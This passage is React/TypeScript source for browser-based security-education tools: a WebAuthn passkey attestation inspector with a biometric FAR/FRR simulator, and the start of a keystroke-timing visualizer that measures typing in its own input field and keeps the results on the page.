"use client";

import React, { useState, useEffect, useCallback, useMemo, useRef } from "react";
import {
  Shield,
  Key,
  Fingerprint,
  Keyboard,
  Hash,
  Cpu,
  Bug,
  Network,
  Cloud,
  PhoneCall,
  Activity,
  FileCheck,
  Server,
  Globe,
  MessageSquareWarning,
  Award,
  AlertTriangle,
  CheckCircle2,
  XCircle,
  Copy,
  Check,
  RefreshCw,
  Zap,
  Lock,
  Terminal,
  Upload,
} from "lucide-react";
import type { Tool } from "@/lib/tools/types";
import { useToolCard, ToolActions } from "@/components/tool/ToolPlaygrounds";

/* ============================================================================
 * HELPER: INLINE COPY BUTTON
 * ========================================================================== */
function InlineCopyButton({ text, label = "Copy" }: { text: string; label?: string }) {
  const [copied, setCopied] = useState(false);
  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(text);
      setCopied(true);
      setTimeout(() => setCopied(false), 1800);
    } catch {
      // ignore clipboard errors
    }
  };
  return (
    <button
      type="button"
      onClick={handleCopy}
      className="inline-flex items-center gap-1 rounded-xs border border-border bg-background px-2 py-1 font-heading text-[10px] font-bold uppercase tracking-wider text-text-muted hover:border-accent hover:text-accent transition cursor-pointer"
    >
      {copied ? <Check className="h-3 w-3 text-emerald-400" /> : <Copy className="h-3 w-3" />}
      {copied ? "Copied" : label}
    </button>
  );
}

/* ============================================================================
 * 1. WEBAUTHN FIDO2 PASSKEY & BIOMETRIC ATTESTATION LAB
 *    Slug: webauthn-fido2-passkey-attestation-lab
 * ========================================================================== */
interface DecodedWebAuthnResult {
  mode: "live" | "simulated";
  credentialId: string;
  clientData: {
    type: string;
    challenge: string;
    origin: string;
    crossOrigin: boolean;
  };
  rpIdHashHex: string;
  flagsByteHex: string;
  flags: {
    UP: boolean; // Bit 0: User Present
    UV: boolean; // Bit 2: User Verified
    BE: boolean; // Bit 3: Backup Eligibility
    BS: boolean; // Bit 4: Backup State
    AT: boolean; // Bit 6: Attested Credential Data
    ED: boolean; // Bit 7: Extension Data
  };
  signCount: number;
  aaguid: string;
}

interface BiometricModalitySpec {
  id: string;
  name: string;
  sensorTech: string;
  baseFarAt50: number;
  baseFrrAt50: number;
  eerPercent: number;
  livenessResistance: string;
  notes: string;
}

const BIOMETRIC_MODALITIES: BiometricModalitySpec[] = [
  {
    id: "fingerprint",
    name: "Fingerprint (Ultrasonic / Capacitive)",
    sensorTech: "3D Ultrasonic Ridge Mapping",
    baseFarAt50: 0.002, // 1 in 50,000
    baseFrrAt50: 1.8,
    eerPercent: 0.42,
    livenessResistance: "High (Sub-epidermal pulse/ridge depth)",
    notes: "Standard mobile biometric; dry/wet skin increases FRR significantly.",
  },
  {
    id: "face3d",
    name: "3D FaceID (Structured Light / ToF)",
    sensorTech: "30,000 IR Dot Projector + Flood Illuminator",
    baseFarAt50: 0.0001, // 1 in 1,000,000
    baseFrrAt50: 0.9,
    eerPercent: 0.12,
    livenessResistance: "Very High (Attention + 3D Depth Map)",
    notes: "Resists 2D photos/videos; statistical twin risk slightly higher.",
  },
  {
    id: "iris",
    name: "Iris Recognition (Near-IR 850nm)",
    sensorTech: "240+ Degrees-of-Freedom Trabecular Meshwork",
    baseFarAt50: 0.00006, // 1 in 1.5M
    baseFrrAt50: 1.1,
    eerPercent: 0.08,
    livenessResistance: "Extreme (Pupil hippus + corneal reflection)",
    notes: "Highest entropy biological modality; virtually zero genetic twin correlation.",
  },
  {
    id: "voice",
    name: "Voice Biometrics (Text-Independent)",
    sensorTech: "MFCC Acoustic Spectrogram + x-vector",
    baseFarAt50: 0.25,
    baseFrrAt50: 4.5,
    eerPercent: 2.35,
    livenessResistance: "Low–Moderate (Vulnerable to AI voice cloning)",
    notes: "Ambient noise and illness degrade FRR; requires anti-deepfake challenge.",
  },
  {
    id: "fido2",
    name: "FIDO2 Hardware Security Key (YubiKey / Passkey)",
    sensorTech: "ECDSA P-256 / Ed25519 Asymmetric Keypair + PIN/Touch",
    baseFarAt50: 0.00000001,
    baseFrrAt50: 0.05,
    eerPercent: 0.001,
    livenessResistance: "Cryptographic Origin-Bound (Phishing-Proof)",
    notes: "Deterministic cryptographic signature bound to exact RP origin TLS domain.",
  },
];

function WebauthnFido2PasskeyAttestationLab({ tool }: { tool: Tool }) {
  const { setOutput, resetTrigger } = useToolCard();
  const [activeTab, setActiveTab] = useState<"webauthn" | "biometric">("webauthn");
  const [webauthnSupport, setWebauthnSupport] = useState({
    supported: false,
    platformUvAvailable: false,
    conditionalMediation: false,
  });
  const [rpName, setRpName] = useState("Zero's Universe Security Lab");
  const [userName, setUserName] = useState("secops@zerosuniverse.org");
  const [userVerification, setUserVerification] = useState<"required" | "preferred" | "discouraged">("preferred");
  const [decodedResult, setDecodedResult] = useState<DecodedWebAuthnResult | null>(null);
  const [ceremonyStatus, setCeremonyStatus] = useState<string>("Ready to inspect browser WebAuthn APIs or run a registration ceremony.");

  // Module B: FAR vs FRR threshold simulator
  const [selectedModalityId, setSelectedModalityId] = useState<string>("face3d");
  const [threshold, setThreshold] = useState<number>(0.72);

  const loadSimulatedAttestation = useCallback(() => {
    const simResult: DecodedWebAuthnResult = {
      mode: "simulated",
      credentialId: "d8f4a9c2e1b7403981726354aabbccddeeff001122334455",
      clientData: {
        type: "webauthn.create",
        challenge: "Y2hhbGxlbmdlX3plcm9fdHJ1c3RfMjAyNl9mYWRlN2I4Yw",
        origin: typeof window !== "undefined" ? window.location.origin : "https://zerosuniverse.com",
        crossOrigin: false,
      },
      rpIdHashHex: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
      flagsByteHex: "0x5d (01011101b)",
      flags: {
        UP: true,
        UV: true,
        BE: true,
        BS: true,
        AT: true,
        ED: false,
      },
      signCount: 0,
      aaguid: "ea9b8d66-4d01-1d21-3ce4-b6b48cb575d4 (Google Password Manager / Platform Passkey)",
    };
    setDecodedResult(simResult);
    setCeremonyStatus("Loaded decoded FIDO2 Passkey Attestation sample (Flags: UP | UV | BE | BS | AT).");
  }, []);

  useEffect(() => {
    setActiveTab("webauthn");
    setThreshold(0.72);
    setSelectedModalityId("face3d");
    loadSimulatedAttestation();

    if (typeof window !== "undefined" && "PublicKeyCredential" in window) {
      const pkc = window.PublicKeyCredential as typeof PublicKeyCredential & {
        isConditionalMediationAvailable?: () => Promise<boolean>;
      };
      Promise.all([
        pkc.isUserVerifyingPlatformAuthenticatorAvailable
          ? pkc.isUserVerifyingPlatformAuthenticatorAvailable().catch(() => false)
          : Promise.resolve(false),
        pkc.isConditionalMediationAvailable
          ? pkc.isConditionalMediationAvailable().catch(() => false)
          : Promise.resolve(false),
      ]).then(([uv, cond]) => {
        setWebauthnSupport({
          supported: true,
          platformUvAvailable: Boolean(uv),
          conditionalMediation: Boolean(cond),
        });
      });
    }
  }, [resetTrigger, loadSimulatedAttestation]);

  const triggerLiveWebAuthn = async () => {
    if (typeof window === "undefined" || !("PublicKeyCredential" in window)) {
      setCeremonyStatus("WebAuthn PublicKeyCredential is not supported in this browser context. Using simulated passkey data.");
      loadSimulatedAttestation();
      return;
    }

    try {
      setCeremonyStatus("Waiting for user touch / FaceID / TouchID / Windows Hello / Security Key...");
      const challenge = new Uint8Array(32);
      window.crypto.getRandomValues(challenge);
      const userId = new Uint8Array(16);
      window.crypto.getRandomValues(userId);

      const credential = (await navigator.credentials.create({
        publicKey: {
          challenge,
          rp: {
            name: rpName,
            id: window.location.hostname,
          },
          user: {
            id: userId,
            name: userName,
            displayName: userName.split("@")[0] || "Security Operator",
          },
          pubKeyCredParams: [
            { alg: -7, type: "public-key" }, // ES256
            { alg: -8, type: "public-key" }, // EdDSA
            { alg: -257, type: "public-key" }, // RS256
          ],
          authenticatorSelection: {
            userVerification,
          },
          timeout: 45000,
          attestation: "direct",
        },
      })) as PublicKeyCredential | null;

      if (!credential) {
        setCeremonyStatus("Registration returned null credential.");
        return;
      }

      const response = credential.response as AuthenticatorAttestationResponse & {
        getAuthenticatorData?: () => ArrayBuffer;
      };

      // Decode clientDataJSON
      const clientDataText = new TextDecoder().decode(response.clientDataJSON);
      const clientDataObj = JSON.parse(clientDataText);

      // Extract authenticatorData if getAuthenticatorData() is available
      let rpIdHashHex = "Unavailable without CBOR parser";
      let flagsByte = 0x45; // default UP + UV + AT
      let signCount = 0;
      let aaguid = "00000000-0000-0000-0000-000000000000";

      if (typeof response.getAuthenticatorData === "function") {
        const authDataBuf = new Uint8Array(response.getAuthenticatorData());
        if (authDataBuf.length >= 37) {
          rpIdHashHex = Array.from(authDataBuf.slice(0, 32))
            .map((b) => b.toString(16).padStart(2, "0"))
            .join("");
          flagsByte = authDataBuf[32];
          const view = new DataView(authDataBuf.buffer, authDataBuf.byteOffset + 33, 4);
          signCount = view.getUint32(0, false);
          if (authDataBuf.length >= 53) {
            const aaguidBytes = Array.from(authDataBuf.slice(37, 53)).map((b) =>
              b.toString(16).padStart(2, "0")
            );
            aaguid = `${aaguidBytes.slice(0, 4).join("")}-${aaguidBytes.slice(4, 6).join("")}-${aaguidBytes.slice(6, 8).join("")}-${aaguidBytes.slice(8, 10).join("")}-${aaguidBytes.slice(10, 16).join("")}`;
          }
        }
      }

      const credIdHex = Array.from(new Uint8Array(credential.rawId))
        .map((b) => b.toString(16).padStart(2, "0"))
        .join("");

      setDecodedResult({
        mode: "live",
        credentialId: credIdHex,
        clientData: {
          type: clientDataObj.type || "webauthn.create",
          challenge: clientDataObj.challenge || "",
          origin: clientDataObj.origin || window.location.origin,
          crossOrigin: Boolean(clientDataObj.crossOrigin),
        },
        rpIdHashHex,
        flagsByteHex: `0x${flagsByte.toString(16).padStart(2, "0")} (${flagsByte.toString(2).padStart(8, "0")}b)`,
        flags: {
          UP: Boolean(flagsByte & 0x01),
          UV: Boolean(flagsByte & 0x04),
          BE: Boolean(flagsByte & 0x08),
          BS: Boolean(flagsByte & 0x10),
          AT: Boolean(flagsByte & 0x40),
          ED: Boolean(flagsByte & 0x80),
        },
        signCount,
        aaguid,
      });
      setCeremonyStatus("Live WebAuthn Registration Ceremony Succeeded! Authenticator data decoded locally.");
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err);
      setCeremonyStatus(`Live ceremony aborted or blocked (${msg}). Showing decoded passkey reference structure below.`);
    }
  };

  const selectedModality = useMemo(
    () => BIOMETRIC_MODALITIES.find((m) => m.id === selectedModalityId) || BIOMETRIC_MODALITIES[1],
    [selectedModalityId]
  );

  // Compute FAR & FRR at current threshold (0.10 to 0.99)
  const biometricMetrics = useMemo(() => {
    const delta = threshold - 0.5;
    // Higher threshold => exponentially lower FAR, exponentially higher FRR
    const computedFar = Math.max(
      0.0000001,
      selectedModality.baseFarAt50 * Math.exp(-delta * 9.5)
    );
    const computedFrr = Math.min(
      99.9,
      Math.max(0.01, selectedModality.baseFrrAt50 * Math.exp(delta * 5.2))
    );
    const oneInN = Math.round(100 / computedFar);
    return {
      farPercent: computedFar,
      frrPercent: computedFrr,
      oneInN,
    };
  }, [selectedModality, threshold]);

  useEffect(() => {
    if (!decodedResult) return;
    const report = [
      `=== WEBAUTHN FIDO2 PASSKEY & BIOMETRIC ATTESTATION REPORT ===`,
      `Browser Support: PublicKeyCredential=${webauthnSupport.supported} | Platform UV=${webauthnSupport.platformUvAvailable} | Conditional UI=${webauthnSupport.conditionalMediation}`,
      `Ceremony Mode: ${decodedResult.mode.toUpperCase()}`,
      `Origin: ${decodedResult.clientData.origin} (Type: ${decodedResult.clientData.type})`,
      `Challenge (Base64URL): ${decodedResult.clientData.challenge}`,
      `RP ID SHA-256 Hash: ${decodedResult.rpIdHashHex}`,
      `Authenticator Flags Byte: ${decodedResult.flagsByteHex}`,
      `  - UP (User Present): ${decodedResult.flags.UP}`,
      `  - UV (User Verified): ${decodedResult.flags.UV}`,
      `  - BE (Backup Eligible / Multi-Device Passkey): ${decodedResult.flags.BE}`,
      `  - BS (Backup State / Synced): ${decodedResult.flags.BS}`,
      `  - AT (Attested Credential Data Included): ${decodedResult.flags.AT}`,
      `AAGUID: ${decodedResult.aaguid}`,
      ``,
      `=== BIOMETRIC FAR vs FRR SIMULATOR (${selectedModality.name}) ===`,
      `Match Threshold: ${(threshold * 100).toFixed(0)}%`,
      `False Acceptance Rate (FAR): ${biometricMetrics.farPercent.toFixed(6)}% (~1 in ${biometricMetrics.oneInN.toLocaleString()})`,
      `False Rejection Rate (FRR): ${biometricMetrics.frrPercent.toFixed(2)}%`,
      `Equal Error Rate (EER): ${selectedModality.eerPercent}%`,
    ].join("\n");
    setOutput(report);
  }, [decodedResult, webauthnSupport, selectedModality, threshold, biometricMetrics, setOutput]);

  return (
    <div className="space-y-5">
      {/* Mode Switch Tabs */}
      <div className="flex flex-wrap gap-2 border-b border-border pb-3">
        <button
          type="button"
          onClick={() => setActiveTab("webauthn")}
          className={`inline-flex items-center gap-2 rounded-xs px-3.5 py-2 font-heading text-xs font-bold uppercase tracking-wider transition cursor-pointer ${
            activeTab === "webauthn"
              ? "bg-[#ff6a00] text-white"
              : "border border-border bg-background text-text-muted hover:text-text"
          }`}
        >
          <Key className="h-3.5 w-3.5" />
          Module A: Live WebAuthn &amp; Passkey Attestation Inspector
        </button>
        <button
          type="button"
          onClick={() => setActiveTab("biometric")}
          className={`inline-flex items-center gap-2 rounded-xs px-3.5 py-2 font-heading text-xs font-bold uppercase tracking-wider transition cursor-pointer ${
            activeTab === "biometric"
              ? "bg-[#ff6a00] text-white"
              : "border border-border bg-background text-text-muted hover:text-text"
          }`}
        >
          <Fingerprint className="h-3.5 w-3.5" />
          Module B: Biometric FAR vs FRR Equal Error Rate (EER) Simulator
        </button>
      </div>

      {activeTab === "webauthn" ? (
        <div className="space-y-4">
          {/* Browser Capabilities Banner */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
            <div className="rounded-xs border border-border bg-background p-3">
              <div className="text-[10px] font-heading uppercase text-text-muted">
                window.PublicKeyCredential
              </div>
              <div className="mt-1 flex items-center gap-1.5 font-mono-code text-xs font-bold text-text">
                {webauthnSupport.supported ? (
                  <CheckCircle2 className="h-4 w-4 text-emerald-400" />
                ) : (
                  <XCircle className="h-4 w-4 text-rose-400" />
                )}
                {webauthnSupport.supported ? "Supported (W3C WebAuthn L2/L3)" : "Unavailable"}
              </div>
            </div>
            <div className="rounded-xs border border-border bg-background p-3">
              <div className="text-[10px] font-heading uppercase text-text-muted">
                Platform UV Authenticator (TouchID / Hello)
              </div>
              <div className="mt-1 flex items-center gap-1.5 font-mono-code text-xs font-bold text-text">
                {webauthnSupport.platformUvAvailable ? (
                  <CheckCircle2 className="h-4 w-4 text-emerald-400" />
                ) : (
                  <AlertTriangle className="h-4 w-4 text-amber-400" />
                )}
                {webauthnSupport.platformUvAvailable ? "Hardware Enclave Ready" : "External Security Key / Off"}
              </div>
            </div>
            <div className="rounded-xs border border-border bg-background p-3">
              <div className="text-[10px] font-heading uppercase text-text-muted">
                Passkey Conditional UI Autofill
              </div>
              <div className="mt-1 flex items-center gap-1.5 font-mono-code text-xs font-bold text-text">
                {webauthnSupport.conditionalMediation ? (
                  <CheckCircle2 className="h-4 w-4 text-emerald-400" />
                ) : (
                  <AlertTriangle className="h-4 w-4 text-amber-400" />
                )}
                {webauthnSupport.conditionalMediation ? "Conditional Mediation Ready" : "Manual Modal Only"}
              </div>
            </div>
          </div>

          {/* Ceremony Controls */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-3 rounded-xs border border-border bg-background p-3.5">
            <div>
              <label className="block font-heading text-[11px] font-bold uppercase text-text-muted">
                Relying Party (RP) Name
              </label>
              <input
                type="text"
                value={rpName}
                onChange={(e) => setRpName(e.target.value)}
                className="mt-1 w-full rounded-xs border border-border bg-surface px-2.5 py-1.5 font-mono-code text-xs text-text"
              />
            </div>
            <div>
              <label className="block font-heading text-[11px] font-bold uppercase text-text-muted">
                Account Handle (user.name)
              </label>
              <input
                type="text"
                value={userName}
                onChange={(e) => setUserName(e.target.value)}
                className="mt-1 w-full rounded-xs border border-border bg-surface px-2.5 py-1.5 font-mono-code text-xs text-text"
              />
            </div>
            <div>
              <label className="block font-heading text-[11px] font-bold uppercase text-text-muted">
                User Verification Requirement
              </label>
              <select
                value={userVerification}
                onChange={(e) =>
                  setUserVerification(e.target.value as "required" | "preferred" | "discouraged")
                }
                className="mt-1 w-full rounded-xs border border-border bg-surface px-2.5 py-1.5 font-mono-code text-xs text-text"
              >
                <option value="preferred">preferred (Biometric/PIN if available)</option>
                <option value="required">required (Enforce Biometric/PIN UV=1)</option>
                <option value="discouraged">discouraged (Touch Presence UP=1 only)</option>
              </select>
            </div>
          </div>

          <div className="flex flex-wrap items-center gap-2.5">
            <button
              type="button"
              onClick={triggerLiveWebAuthn}
              className="inline-flex items-center gap-2 rounded-xs bg-[#ff6a00] px-4 py-2 font-heading text-xs font-bold uppercase tracking-wider text-white hover:opacity-90 transition cursor-pointer"
            >
              <Fingerprint className="h-4 w-4" />
              Trigger Local WebAuthn Registration Ceremony
            </button>
            <button
              type="button"
              onClick={loadSimulatedAttestation}
              className="inline-flex items-center gap-1.5 rounded-xs border border-border bg-background px-3 py-2 font-heading text-xs font-semibold uppercase tracking-wider text-text hover:border-accent transition cursor-pointer"
            >
              <RefreshCw className="h-3.5 w-3.5 text-accent" />
              Load Sample Passkey Attestation
            </button>
            <span className="text-xs font-mono-code text-text-muted">{ceremonyStatus}</span>
          </div>

          {decodedResult && (
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
              {/* Decoded clientDataJSON */}
              <div className="rounded-xs border border-border bg-background p-3.5 space-y-2">
                <div className="flex items-center justify-between">
                  <span className="font-heading text-xs font-bold uppercase tracking-wider text-accent">
                    Decoded clientDataJSON
                  </span>
                  <span className="rounded-xs bg-surface px-2 py-0.5 font-mono-code text-[10px] text-text-muted">
                    {decodedResult.mode === "live" ? "LIVE HARDWARE RESPONSE" : "SAMPLE ATTESTATION"}
                  </span>
                </div>
                <div className="space-y-1.5 font-mono-code text-xs">
                  <div className="flex justify-between border-b border-border/60 py-1">
                    <span className="text-text-muted">type:</span>
                    <span className="text-emerald-400">{decodedResult.clientData.type}</span>
                  </div>
                  <div className="flex justify-between border-b border-border/60 py-1">
                    <span className="text-text-muted">origin (Phishing Bound):</span>
                    <span className="text-text">{decodedResult.clientData.origin}</span>
                  </div>
                  <div className="flex justify-between border-b border-border/60 py-1">
                    <span className="text-text-muted">challenge (32B Base64URL):</span>
                    <span className="text-text truncate max-w-[220px]">
                      {decodedResult.clientData.challenge}
                    </span>
                  </div>
                  <div className="flex justify-between py-1">
                    <span className="text-text-muted">RP ID SHA-256:</span>
                    <span className="text-text truncate max-w-[220px]">
                      {decodedResult.rpIdHashHex}
                    </span>
                  </div>
                </div>
              </div>

              {/* AuthenticatorData Bit Flags */}
              <div className="rounded-xs border border-border bg-background p-3.5 space-y-2.5">
                <div className="flex items-center justify-between">
                  <span className="font-heading text-xs font-bold uppercase tracking-wider text-accent">
                    authenticatorData Bit Flags ({decodedResult.flagsByteHex})
                  </span>
                  <span className="font-mono-code text-[11px] text-text-muted">
                    SignCount: {decodedResult.signCount}
                  </span>
                </div>
                <div className="grid grid-cols-2 sm:grid-cols-3 gap-2">
                  {[
                    { key: "UP", label: "Bit 0: User Present", active: decodedResult.flags.UP },
                    { key: "UV", label: "Bit 2: User Verified", active: decodedResult.flags.UV },
                    { key: "BE", label: "Bit 3: Backup Eligible", active: decodedResult.flags.BE },
                    { key: "BS", label: "Bit 4: Backup State", active: decodedResult.flags.BS },
                    { key: "AT", label: "Bit 6: Attested Cred", active: decodedResult.flags.AT },
                    { key: "ED", label: "Bit 7: Extension Data", active: decodedResult.flags.ED },
                  ].map((item) => (
                    <div
                      key={item.key}
                      className={`rounded-xs border p-2 font-mono-code text-xs ${
                        item.active
                          ? "border-emerald-500/40 bg-emerald-500/10 text-emerald-300"
                          : "border-border bg-surface text-text-muted"
                      }`}
                    >
                      <div className="font-bold">
                        {item.key} = {item.active ? "1" : "0"}
                      </div>
                      <div className="text-[10px] opacity-80">{item.label}</div>
                    </div>
                  ))}
                </div>
                <div className="text-[11px] font-mono-code text-text-muted pt-1">
                  AAGUID: <span className="text-text">{decodedResult.aaguid}</span>
                </div>
              </div>
            </div>
          )}
        </div>
      ) : (
        /* Module B: Biometric FAR vs FRR Simulator */
        <div className="space-y-4">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-3 rounded-xs border border-border bg-background p-3.5">
            <div>
              <label className="block font-heading text-[11px] font-bold uppercase text-text-muted">
                Biometric / Hardware Modality
              </label>
              <select
                value={selectedModalityId}
                onChange={(e) => setSelectedModalityId(e.target.value)}
                className="mt-1.5 w-full rounded-xs border border-border bg-surface px-2.5 py-2 font-mono-code text-xs text-text"
              >
                {BIOMETRIC_MODALITIES.map((m) => (
                  <option key={m.id} value={m.id}>
                    {m.name} (EER: {m.eerPercent}%)
                  </option>
                ))}
              </select>
            </div>
            <div>
              <div className="flex justify-between font-heading text-[11px] font-bold uppercase text-text-muted">
                <span>Matcher Decision Threshold (τ)</span>
                <span className="text-accent font-mono-code">{(threshold * 100).toFixed(0)}% Strictness</span>
              </div>
              <input
                type="range"
                min={0.2}
                max={0.95}
                step={0.01}
                value={threshold}
                onChange={(e) => setThreshold(Number(e.target.value))}
                className="mt-2.5 w-full accent-[#ff6a00]"
              />
              <div className="flex justify-between text-[10px] font-mono-code text-text-muted">
                <span>0.20 (Convenient / High FAR)</span>
                <span>EER Crossover</span>
                <span>0.95 (High Security / High FRR)</span>
              </div>
            </div>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
            <div className="rounded-xs border border-border bg-background p-3.5">
              <div className="text-[10px] font-heading uppercase text-text-muted">
                False Acceptance Rate (FAR — Impostor Pass)
              </div>
              <div className="mt-1 font-mono-code text-base font-bold text-rose-400">
                {biometricMetrics.farPercent < 0.0001
                  ? biometricMetrics.farPercent.toExponential(2)
                  : biometricMetrics.farPercent.toFixed(5)}
                %
              </div>
              <div className="text-[11px] text-text-muted">
                ~1 in {biometricMetrics.oneInN.toLocaleString()} impostor attempts
              </div>
            </div>
            <div className="rounded-xs border border-border bg-background p-3.5">
              <div className="text-[10px] font-heading uppercase text-text-muted">
                False Rejection Rate (FRR — Legit User Blocked)
              </div>
              <div className="mt-1 font-mono-code text-base font-bold text-amber-400">
                {biometricMetrics.frrPercent.toFixed(2)}%
              </div>
              <div className="text-[11px] text-text-muted">
                Sensor: {selectedModality.sensorTech}
              </div>
            </div>
            <div className="rounded-xs border border-border bg-background p-3.5">
              <div className="text-[10px] font-heading uppercase text-text-muted">
                Equal Error Rate (EER) &amp; PAD Liveness
              </div>
              <div className="mt-1 font-mono-code text-base font-bold text-emerald-400">
                EER {selectedModality.eerPercent}%
              </div>
              <div className="text-[11px] text-text-muted">{selectedModality.livenessResistance}</div>
            </div>
          </div>

          {/* SVG FAR vs FRR Curve Visualization */}
          <div className="rounded-xs border border-border bg-background p-3.5">
            <div className="mb-2 flex items-center justify-between">
              <span className="font-heading text-xs font-bold uppercase tracking-wider text-text">
                FAR vs FRR Error Tradeoff Curve &amp; EER Crossover
              </span>
              <span className="font-mono-code text-[11px] text-text-muted">
                Red = FAR (Security Risk) | Amber = FRR (UX Friction)
              </span>
            </div>
            <svg viewBox="0 0 500 140" className="w-full h-36 bg-surface rounded-xs border border-border/60">
              {/* Grid lines */}
              <line x1="40" y1="20" x2="470" y2="20" stroke="#334155" strokeDasharray="3 3" strokeWidth="1" />
              <line x1="40" y1="70" x2="470" y2="70" stroke="#334155" strokeDasharray="3 3" strokeWidth="1" />
              <line x1="40" y1="120" x2="470" y2="120" stroke="#334155" strokeWidth="1" />
              {/* FAR decreasing curve */}
              <path
                d="M 40 22 Q 180 105, 470 119"
                fill="none"
                stroke="#fb7185"
                strokeWidth="2.5"
              />
              {/* FRR increasing curve */}
              <path
                d="M 40 119 Q 300 105, 470 22"
                fill="none"
                stroke="#fbbf24"
                strokeWidth="2.5"
              />
              {/* EER intersection marker */}
              <circle cx="245" cy="94" r="4.5" fill="#34d399" />
              <text x="220" y="83" fill="#34d399" fontSize="10" fontFamily="monospace">
                EER ({selectedModality.eerPercent}%)
              </text>
              {/* Current threshold vertical line */}
              <line
                x1={40 + ((threshold - 0.2) / 0.75) * 430}
                y1="15"
                x2={40 + ((threshold - 0.2) / 0.75) * 430}
                y2="125"
                stroke="#ff6a00"
                strokeWidth="2"
              />
              <text
                x={Math.min(415, Math.max(45, 45 + ((threshold - 0.2) / 0.75) * 430))}
                y="28"
                fill="#ff6a00"
                fontSize="10"
                fontFamily="monospace"
              >
                τ={(threshold * 100).toFixed(0)}%
              </text>
            </svg>
            <p className="mt-2 text-xs text-text-muted">{selectedModality.notes}</p>
          </div>
        </div>
      )}

      <ToolActions tool={tool} />
    </div>
  );
}

/* ============================================================================
 * 2. KEYSTROKE DYNAMICS & KEYLOGGER TIMING VISUALIZER
 *    Slug: keystroke-dynamics-keylogger-timing-visualizer
 * ========================================================================== */
interface KeystrokeTimingEvent {
  index: number;
  key: string;
  dwellMs: number;
  flightMs: number;
}

const SAMPLE_TYPING_PHRASES = [
  "zero trust architecture 2026",
  "sudo systemctl restart sshd",
  "correct horse battery staple",
];

function KeystrokeDynamicsKeyloggerTimingVisualizer({ tool }: { tool: Tool }) {
  const { setOutput, resetTrigger } = useToolCard();
  const [targetPhrase, setTargetPhrase] = useState(SAMPLE_TYPING_PHRASES[0]);
  const [typedText, setTypedText] = useState("");
  const [events, setEvents] = useState<KeystrokeTimingEvent[]>([]);
  const activeKeyDownMap = useRef<Record<string, number>>({});
  const lastKeyUpTime = useRef<number | null>(null);

  const loadSimulatedTypingSample = useCallback((phrase: string) => {
    const simulated: KeystrokeTimingEvent[] = [];
    for (let i = 0; i < phrase.length; i++) {
      const ch = phrase[i];
      const deterministicSeed = (ch.charCodeAt(0) * 17 + i * 31) % 45;
      const dwellMs = Math.round(68 + deterministicSeed);
      const flightMs = i === 0 ? 0 : Math.round(85 + ((i * 29) % 90) - (ch === " " ? 25 : 0));
      simulated.push({
        index: i,
        key: ch === " " ? "SPACE" : ch,
        dwellMs,
        flightMs,
      });
    }
    setTypedText(phrase);
    setEvents(simulated);
  }, []);

  useEffect(() => {
    setTargetPhrase(SAMPLE_TYPING_PHRASES[0]);
    loadSimulatedTypingSample(SAMPLE_TYPING_PHRASES[0]);
  }, [resetTrigger, loadSimulatedTypingSample]);

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Shift" || e.key === "Control" || e.key === "Alt" || e.key === "Meta") return;
    const now = performance.now();
    if (!activeKeyDownMap.current[e.key]) {
      activeKeyDownMap.current[e.key] = now;
    }
  };

  const handleKeyUp = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Shift" || e.key === "Control" || e.key === "Alt" || e.key === "Meta") return;
    if (e.key === "Backspace") {
      return;
    }
    const now = performance.now();
    const downTime = activeKeyDownMap.current[e.key] ?? now - 75;
    delete activeKeyDownMap.current[e.key];

    const dwellMs = Math.max(5, Math.round(now - downTime));
    const flightMs =
      lastKeyUpTime.current !== null ? Math.round(downTime - lastKeyUpTime.current) : 0;
    lastKeyUpTime.current = now;

    setEvents((prev) => [
      ...prev.slice(-39),
      {
        index: prev.length,
        key: e.key === " " ? "SPACE" : e.key,
        dwellMs,
        flightMs,
      },
    ]);
  };

  const clearRecording = () => {
    setTypedText("");
    setEvents([]);
    activeKeyDownMap.current = {};
    lastKeyUpTime.current = null;
  };

  const stats = useMemo(() => {
    if (events.length === 0) {
      return { avgDwell: 0, avgFlight: 0, wpm: 0, consistencyScore: 0, rolloverCount: 0 };
    }
    const avgDwell = Math.round(events.reduce((acc, e) => acc + e.dwellMs, 0) / events.length);
    const flightEvents = events.slice(1);
    const avgFlight =
      flightEvents.length > 0
        ? Math.round(flightEvents.reduce((acc, e) => acc + e.flightMs, 0) / flightEvents.length)
        : 0;
    const totalTimeMs = events.reduce((acc, e) => acc + e.dwellMs + Math.max(0, e.flightMs), 0);
    const words = events.length / 5;
    const wpm = totalTimeMs > 0 ? Math.round((words / (totalTimeMs / 60000))) : 0;
    const rolloverCount = flightEvents.filter((e) => e.flightMs < 0).length;

    // Variance of dwell times for biometric consistency
    const variance =
      events.reduce((acc, e) => acc + Math.pow(e.dwellMs - avgDwell, 2), 0) / events.length;
    const stdDev = Math.sqrt(variance);
    const consistencyScore = Math.max(40, Math.min(99, Math.round(100 - stdDev * 0.9)));

    return { avgDwell, avgFlight, wpm, consistencyScore, rolloverCount };
  }, [events]);

  useEffect(() => {
    const out = [
      `=== KEYSTROKE DYNAMICS & TIMING TELEMETRY REPORT ===`,
      `Target Phrase: "${targetPhrase}"`,
      `Captured Keystrokes: ${events.length}`,
      `Mean Dwell Time (Hold): ${stats.avgDwell} ms`,
      `Mean Flight Time (Inter-Key Latency): ${stats.avgFlight} ms`,
      `Estimated Typing Speed: ${stats.wpm} WPM | N-Key Rollover Overlaps: ${stats.rolloverCount}`,
      `Biometric Rhythm Consistency Score: ${stats.consistencyScore}/100`,
      ``,
      `INDEX | KEY   | DWELL (ms) | FLIGHT (ms)`,
      ...events.map(
        (ev, idx) =>
          `${String(idx + 1).padStart(5)} | ${ev.key.padEnd(5)} | ${String(ev.dwellMs).padStart(10)} | ${String(ev.flightMs).padStart(11)}`
      ),
    ].join("\n");
    setOutput(out);
  }, [targetPhrase, events, stats, setOutput]);

  return (
    <div className="space-y-4">
      {/* Phrase Presets */}
      <div className="flex flex-wrap items-center justify-between gap-2">
        <div className="flex flex-wrap items-center gap-1.5">
          <span className="font-heading text-[11px] font-bold uppercase text-text-muted mr-1">
            Phrase Presets:
          </span>
          {SAMPLE_TYPING_PHRASES.map((phrase) => (
            <button
